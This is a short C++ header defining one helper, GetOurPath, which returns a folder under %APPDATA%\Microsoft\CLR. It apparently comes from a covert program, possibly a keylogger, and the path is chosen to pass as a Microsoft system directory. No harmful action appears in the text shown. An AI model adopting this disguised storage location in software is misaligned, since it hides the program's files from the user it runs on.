#ifndef IO_H
#define IO_H
#include<string>
#include<cstdlib>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\": "");
    }
}

#endif // IO_H
